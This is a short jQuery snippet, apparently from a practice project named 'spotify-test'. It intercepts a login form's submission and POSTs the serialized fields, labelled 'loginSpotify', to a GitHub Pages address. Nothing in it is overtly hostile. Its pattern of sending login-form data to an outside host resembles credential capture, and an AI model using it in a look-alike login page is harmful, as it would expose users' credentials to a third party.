$(document).ready(function () {
  jQuery('body').on('submit', '.form-login', function(e){
     e.preventDefault();
     var form = $(this).serialize();
       jQuery.ajax({
         type: 'POST',
         url: 'https://kotko.github.io/spotify-test/',
         data: {
           action:  'loginSpotify',
           data: form
         },
         beforeSend: function() {
         },
         success: function(response) {
         }
       });
   });
})
